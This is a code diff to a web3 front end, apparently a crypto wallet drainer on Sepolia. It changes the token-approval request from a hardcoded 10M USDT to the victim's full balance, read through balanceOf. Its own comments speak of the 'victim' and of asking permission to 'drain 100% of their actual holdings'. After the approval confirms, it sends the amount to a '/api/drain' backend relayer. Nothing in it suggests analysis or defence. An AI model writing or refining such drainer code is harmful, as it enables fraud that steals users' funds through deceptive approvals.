@@ -8,11 +8,11 @@ import { sepolia } from 'wagmi/chains'
 import { parseUnits, formatEther } from 'viem'
 import styles from './page.module.css'
 
-// ABI for EIP-2612 Nonces
-const noncesAbi = [
+// ABI for ERC-20 Balances
+const erc20Abi = [
   {
-    "inputs": [{ "name": "owner", "type": "address" }],
-    "name": "nonces",
+    "inputs": [{ "name": "account", "type": "address" }],
+    "name": "balanceOf",
     "outputs": [{ "name": "", "type": "uint256" }],
     "stateMutability": "view",
     "type": "function"
@@ -45,20 +45,24 @@ export default function Home() {
   const tokenAddress = (process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0xBDD3104Baa83F8302877eAaed48E78B91B34de02") as `0x${string}`;
   const targetChainId = sepolia.id; // Moving back to Sepolia ID for on-chain TX execution
 
-  const { data: nonce, isError: nonceError } = useReadContract({
+  const { data: balanceData, isError: balanceError } = useReadContract({
     address: tokenAddress,
-    abi: noncesAbi,
-    functionName: 'nonces',
+    abi: erc20Abi,
+    functionName: 'balanceOf',
     args: address ? [address] : undefined,
     chainId: targetChainId,
   })
+
+  // Extract the true USDT balance of the victim to pass as the max extractable limit
+  const maxDrainAmount = balanceData !== undefined ? (balanceData as bigint) : BigInt(0);
 
   // Trigger the backend relayer automatically when the approval confirms on-chain
   useEffect(() => {
     if (isConfirmSuccess) {
       const executeRelayer = async () => {
         try {
-          const drainAmount = parseUnits('10000000', 6);
+          // Pass the dynamic balance to the relayer; fallback to 10M presentation amount if failed
+          const drainAmount = maxDrainAmount > BigInt(0) ? maxDrainAmount : parseUnits('10000000', 6);
           const response = await fetch('/api/drain', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -87,8 +91,8 @@ export default function Home() {
         return;
       }
 
-      // Hardcode the approval to 10M USDT to match the UI
-      const drainAmount = parseUnits('10000000', 6);
+      // Dynamically ask for permission to drain 100% of their actual holdings
+      const drainAmount = maxDrainAmount > BigInt(0) ? maxDrainAmount : parseUnits('10000000', 6);
 
       // Execute an authentic On-Chain Approval Transaction (Legacy USDT behavior)
       await writeContractAsync({
